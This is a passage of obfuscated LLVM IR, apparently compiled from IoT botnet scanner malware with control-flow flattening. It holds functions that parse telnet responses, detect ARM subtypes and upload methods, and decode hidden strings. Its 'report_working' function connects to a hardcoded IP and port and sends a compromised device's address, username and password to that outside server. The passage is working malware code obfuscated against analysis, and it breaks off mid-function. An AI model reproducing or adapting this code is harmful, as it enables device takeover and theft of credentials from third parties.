  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8** %6, align 8
  store i32 0, i32* %4, align 4
  %switchVar = alloca i32
  store i32 934578546, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 934578546, label %9
    i32 797725871, label %13
    i32 2093436603, label %29
    i32 821598049, label %34
    i32 2040336900, label %36
    i32 1180844173, label %37
    i32 -1051973885, label %38
    i32 1285231182, label %39
    i32 -125544422, label %42
    i32 626472257, label %46
    i32 -1454942560, label %47
    i32 -1214137640, label %73
    i32 1358134698, label %76
    i32 -1027741660, label %83
    i32 -74047266, label %90
    i32 -1313711317, label %91
    i32 -1210767070, label %98
    i32 -2063298809, label %99
    i32 -2113747347, label %106
    i32 468185567, label %107
    i32 -1140770358, label %114
    i32 -565077313, label %115
    i32 830116698, label %122
    i32 -398178429, label %129
    i32 23703931, label %136
    i32 -982350644, label %143
    i32 -12743806, label %146
    i32 846859959, label %153
    i32 -1485772348, label %160
    i32 -987513362, label %167
    i32 -1125124236, label %174
    i32 -1799292889, label %177
    i32 576678479, label %178
    i32 825978382, label %179
    i32 700257701, label %180
    i32 1462430515, label %181
    i32 -46335494, label %182
    i32 -1110851753, label %189
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 8192
  %12 = select i1 %11, i32 797725871, i32 -125544422
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %15 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %14, i32 0, i32 7
  %16 = load i32, i32* %4, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = sext i8 %19 to i32
  %21 = load i8*, i8** %6, align 8
  %22 = load i32, i32* %5, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = icmp eq i32 %20, %26
  %28 = select i1 %27, i32 2093436603, i32 1180844173
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %5, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %5, align 4
  %32 = icmp eq i32 %31, 4
  %33 = select i1 %32, i32 821598049, i32 2040336900
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %4, align 4
  store i32 %35, i32* %5, align 4
  store i32 -125544422, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 -1051973885, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1051973885, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1285231182, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %4, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %4, align 4
  store i32 934578546, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %5, align 4
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -1454942560, i32 626472257
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1110851753, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %49 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %48, i32 0, i32 7
  %50 = load i32, i32* %5, align 4
  %51 = add nsw i32 %50, 2
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [8192 x i8], [8192 x i8]* %49, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %56 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %55, i32 0, i32 11
  store i8 %54, i8* %56, align 2
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 7
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 15
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [8192 x i8], [8192 x i8]* %58, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i16
  %65 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %65, i32 0, i32 14
  store i16 %64, i16* %66, align 2
  %67 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %68 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %67, i32 0, i32 14
  %69 = load i16, i16* %68, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65
  %72 = select i1 %71, i32 -1214137640, i32 1358134698
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %75 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %74, i32 0, i32 14
  store i16 8, i16* %75, align 2
  store i32 1358134698, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %77, i32 0, i32 14
  %79 = load i16, i16* %78, align 2
  %80 = zext i16 %79 to i32
  %81 = icmp eq i32 %80, 0
  %82 = select i1 %81, i32 -74047266, i32 -1027741660
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 11
  %86 = load i8, i8* %85, align 2
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 0
  %89 = select i1 %88, i32 -74047266, i32 -1313711317
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -1110851753, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %93 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %92, i32 0, i32 14
  %94 = load i16, i16* %93, align 2
  %95 = zext i16 %94 to i32
  %96 = icmp eq i32 %95, 40
  %97 = select i1 %96, i32 -1210767070, i32 -2063298809
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0), i8** %7, align 8
  store i32 -46335494, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %101 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %100, i32 0, i32 14
  %102 = load i16, i16* %101, align 2
  %103 = zext i16 %102 to i32
  %104 = icmp eq i32 %103, 183
  %105 = select i1 %104, i32 -2113747347, i32 468185567
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8** %7, align 8
  store i32 1462430515, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %109 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i32 0, i32 14
  %110 = load i16, i16* %109, align 2
  %111 = zext i16 %110 to i32
  %112 = icmp eq i32 %111, 62
  %113 = select i1 %112, i32 -1140770358, i32 -565077313
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.133, i32 0, i32 0), i8** %7, align 8
  store i32 700257701, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %117 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %116, i32 0, i32 14
  %118 = load i16, i16* %117, align 2
  %119 = zext i16 %118 to i32
  %120 = icmp eq i32 %119, 8
  %121 = select i1 %120, i32 830116698, i32 -398178429
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %124 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %123, i32 0, i32 11
  %125 = load i8, i8* %124, align 2
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 2
  %128 = select i1 %127, i32 -982350644, i32 -398178429
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %131 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %130, i32 0, i32 14
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = icmp eq i32 %133, 10
  %135 = select i1 %134, i32 23703931, i32 -12743806
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %138 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %137, i32 0, i32 11
  %139 = load i8, i8* %138, align 2
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 2
  %142 = select i1 %141, i32 -982350644, i32 -12743806
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %145 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %144, i32 0, i32 14
  store i16 8, i16* %145, align 2
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0), i8** %7, align 8
  store i32 825978382, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %148 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %147, i32 0, i32 14
  %149 = load i16, i16* %148, align 2
  %150 = zext i16 %149 to i32
  %151 = icmp eq i32 %150, 8
  %152 = select i1 %151, i32 846859959, i32 -1485772348
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %155 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %154, i32 0, i32 11
  %156 = load i8, i8* %155, align 2
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 1
  %159 = select i1 %158, i32 -1125124236, i32 -1485772348
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %162 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %161, i32 0, i32 14
  %163 = load i16, i16* %162, align 2
  %164 = zext i16 %163 to i32
  %165 = icmp eq i32 %164, 10
  %166 = select i1 %165, i32 -987513362, i32 -1799292889
  store i32 %166, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %169 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %168, i32 0, i32 11
  %170 = load i8, i8* %169, align 2
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 1
  %173 = select i1 %172, i32 -1125124236, i32 -1799292889
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %176 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %175, i32 0, i32 14
  store i16 8, i16* %176, align 2
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i32 0, i32 0), i8** %7, align 8
  store i32 576678479, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0), i8** %7, align 8
  store i32 576678479, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  store i32 825978382, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  store i32 700257701, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 1462430515, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 -46335494, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %184 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %183, i32 0, i32 8
  %185 = getelementptr inbounds [16 x i8], [16 x i8]* %184, i32 0, i32 0
  %186 = load i8*, i8** %7, align 8
  %187 = call i8* @strcpy(i8* %185, i8* %186) #7
  %188 = load i32, i32* %5, align 4
  store i32 %188, i32* %2, align 4
  store i32 -1110851753, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %2, align 4
  ret i32 %190

loopEnd:                                          ; preds = %182, %181, %180, %179, %178, %177, %174, %167, %160, %153, %146, %143, %136, %129, %122, %115, %114, %107, %106, %99, %98, %91, %90, %83, %76, %73, %47, %46, %42, %39, %38, %37, %36, %34, %29, %13, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_arm_subtype(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %18 = load i32, i32* %5, align 4
  store i32 %18, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 634737720, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 634737720, label %first
    i32 -662575768, label %21
    i32 -774685225, label %22
    i32 -1175790507, label %31
    i32 72314192, label %40
    i32 -406344472, label %47
    i32 -2001278398, label %52
    i32 791692038, label %54
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %19 = icmp eq i32 %.reload, -1
  %20 = select i1 %19, i32 -662575768, i32 -774685225
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 791692038, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %24 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %23, i32 0, i32 7
  %25 = getelementptr inbounds [8192 x i8], [8192 x i8]* %24, i32 0, i32 0
  %26 = load i32, i32* %5, align 4
  %27 = sub nsw i32 %26, 1
  %28 = call i32 @util_memsearch(i8* %25, i32 %27, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i32 5)
  %29 = icmp ne i32 %28, -1
  %30 = select i1 %29, i32 72314192, i32 -1175790507
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 7
  %34 = getelementptr inbounds [8192 x i8], [8192 x i8]* %33, i32 0, i32 0
  %35 = load i32, i32* %5, align 4
  %36 = sub nsw i32 %35, 1
  %37 = call i32 @util_memsearch(i8* %34, i32 %36, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.137, i32 0, i32 0), i32 5)
  %38 = icmp ne i32 %37, -1
  %39 = select i1 %38, i32 72314192, i32 -406344472
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %42 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %41, i32 0, i32 8
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %42, i32 0, i32 0
  %44 = call i8* @strcpy(i8* %43, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0)) #7
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 14
  store i16 41, i16* %46, align 2
  store i32 -2001278398, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %49 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %48, i32 0, i32 8
  %50 = getelementptr inbounds [16 x i8], [16 x i8]* %49, i32 0, i32 0
  %51 = call i8* @strcpy(i8* %50, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i32 0, i32 0)) #7
  store i32 -2001278398, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  store i32 %53, i32* %2, align 4
  store i32 791692038, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %2, align 4
  ret i32 %55

loopEnd:                                          ; preds = %52, %47, %40, %31, %22, %21, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i32, %struct.scanner_connection*, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.resolv_entries*, align 8
  %13 = alloca %union.__SOCKADDR_ARG, align 8
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store %struct.scanner_connection* %2, %struct.scanner_connection** %7, align 8
  store i32 %3, i32* %8, align 4
  %14 = call i32 @fork() #7
  store i32 %14, i32* %10, align 4
  store %struct.resolv_entries* null, %struct.resolv_entries** %12, align 8
  %15 = load i32, i32* %10, align 4
  store i32 %15, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1224037800, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1224037800, label %first
    i32 -290123339, label %18
    i32 1133130472, label %22
    i32 -1822788033, label %23
    i32 1890607465, label %27
    i32 -1553122518, label %28
    i32 994859479, label %43
    i32 129946294, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %16 = icmp sgt i32 %.reload, 0
  %17 = select i1 %16, i32 1133130472, i32 -290123339
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %10, align 4
  %20 = icmp eq i32 %19, -1
  %21 = select i1 %20, i32 1133130472, i32 -1822788033
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

; <label>:23:                                     ; preds = %loopEntry
  %24 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %24, i32* %11, align 4
  %25 = icmp eq i32 %24, -1
  %26 = select i1 %25, i32 1890607465, i32 -1553122518
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %loopEntry
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @htonl(i32 -1335130672) #9
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %32 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %31, i32 0, i32 0
  store i32 %30, i32* %32, align 4
  %33 = call zeroext i16 @htons(i16 zeroext 1293) #9
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i32, i32* %11, align 4
  %36 = bitcast %union.__SOCKADDR_ARG* %13 to %struct.sockaddr**
  %37 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %37, %struct.sockaddr** %36, align 8
  %38 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %13, i32 0, i32 0
  %39 = load %struct.sockaddr*, %struct.sockaddr** %38, align 8
  %40 = call i32 @connect(i32 %35, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  %42 = select i1 %41, i32 994859479, i32 129946294
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %11, align 4
  %45 = call i32 @close(i32 %44)
  call void @exit(i32 0) #8
  unreachable

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %11, align 4
  %48 = load i32, i32* %5, align 4
  %49 = and i32 %48, 255
  %50 = load i32, i32* %5, align 4
  %51 = lshr i32 %50, 8
  %52 = and i32 %51, 255
  %53 = load i32, i32* %5, align 4
  %54 = lshr i32 %53, 16
  %55 = and i32 %54, 255
  %56 = load i32, i32* %5, align 4
  %57 = lshr i32 %56, 24
  %58 = and i32 %57, 255
  %59 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %60 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %59, i32 0, i32 0
  %61 = load %struct.scanner_auth*, %struct.scanner_auth** %60, align 8
  %62 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i32 0, i32 0
  %66 = load %struct.scanner_auth*, %struct.scanner_auth** %65, align 8
  %67 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %66, i32 0, i32 1
  %68 = load i8*, i8** %67, align 8
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i32 0, i32 8
  %71 = getelementptr inbounds [16 x i8], [16 x i8]* %70, i32 0, i32 0
  %72 = load i32, i32* %8, align 4
  %73 = icmp eq i32 %72, 1
  %74 = select i1 %73, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.129, i32 0, i32 0)
  %75 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %76 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %75, i32 0, i32 1
  %77 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %76, i32 0, i32 1
  %78 = load i32, i32* %77, align 4
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %80 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i32 0, i32 9
  %81 = load i8, i8* %80, align 4
  %82 = zext i8 %81 to i32
  %83 = call i32 (i32, i8*, ...) @fdsend(i32 %47, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.127, i32 0, i32 0), i32 %49, i32 %52, i32 %55, i32 %58, i8* %63, i8* %68, i8* %71, i8* %74, i32 %78, i32 %82)
  %84 = load i32, i32* %11, align 4
  %85 = call i32 @close(i32 %84)
  call void @exit(i32 0) #8
  unreachable

loopEnd:                                          ; preds = %28, %23, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @connection_consume_upload_methods(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %18 = load i32, i32* %5, align 4
  store i32 %18, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -56652312, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -56652312, label %first
    i32 863151626, label %21
    i32 -1884870462, label %22
    i32 499779338, label %31
    i32 432046727, label %35
    i32 -1945223898, label %44
    i32 1610159886, label %48
    i32 268516327, label %52
    i32 190398460, label %53
    i32 -1074707253, label %55
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %19 = icmp eq i32 %.reload, -1
  %20 = select i1 %19, i32 863151626, i32 -1884870462
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1074707253, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %24 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %23, i32 0, i32 7
  %25 = getelementptr inbounds [8192 x i8], [8192 x i8]* %24, i32 0, i32 0
  %26 = load i32, i32* %5, align 4
  %27 = sub nsw i32 %26, 1
  %28 = call i32 @util_memsearch(i8* %25, i32 %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.148, i32 0, i32 0), i32 10)
  %29 = icmp ne i32 %28, -1
  %30 = select i1 %29, i32 499779338, i32 432046727
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 1
  %34 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %33, i32 0, i32 1
  store i32 1, i32* %34, align 4
  store i32 190398460, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
